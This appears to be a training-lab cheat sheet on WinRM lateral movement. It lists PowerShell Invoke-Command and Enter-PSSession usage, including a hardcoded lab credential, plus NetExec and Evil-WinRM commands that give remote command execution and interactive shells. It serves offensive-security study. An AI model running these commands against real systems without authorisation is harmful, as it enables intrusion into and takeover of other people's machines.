## WinRM Lateral Movement

To use **WinRM (Windows Remote Management)** for lateral movement, an attacker must have **administrative privileges** or explicit permission to use WinRM. By default, members of the **Remote Management Users** group have the necessary rights to access WinRM.

WinRM allows remote management and command execution using PowerShell, making it a powerful and commonly abused lateral movement technique.



## Windows

PowerShell cmdlets can be used to interact with WinRM to manage and execute commands on remote systems.


### Invoke-Command

`Invoke-Command` allows execution of PowerShell commands or scripts on one or more remote computers while returning the output to the attacker’s console.

```
Invoke-Command -ComputerName <comp_name> { command1; command2 }
```

#### Passing Explicit Credentials

Commands can be executed under a specific user context by passing credentials.

```
$username = "INLANEFREIGHT\Helen"
$password = "RedRiot88"
$securePassword = ConvertTo-SecureString $password -AsPlainText -Force
$credential = New-Object System.Management.Automation.PSCredential ($username, $securePassword)

Invoke-Command -ComputerName 172.20.0.52 -Credential $credential -ScriptBlock { whoami; hostname }
```

---

### Enter-PSSession

`Enter-PSSession` provides an **interactive PowerShell shell** on a remote system. It can use either the current user’s session or explicitly supplied credentials.

```
Enter-PSSession -ComputerName <hostname>
```


## Linux

### NetExec (WinRM)

```
netexec winrm <ip> -u <user> -p <pass> -x "command"
```


### Evil-WinRM

**Evil-WinRM** is a popular WinRM exploitation tool that provides an interactive PowerShell shell and supports loading PowerShell scripts, DLLs, and other payloads.

```
evil-winrm -i <IP_or_Hostname> -u <username> -p <password>
```

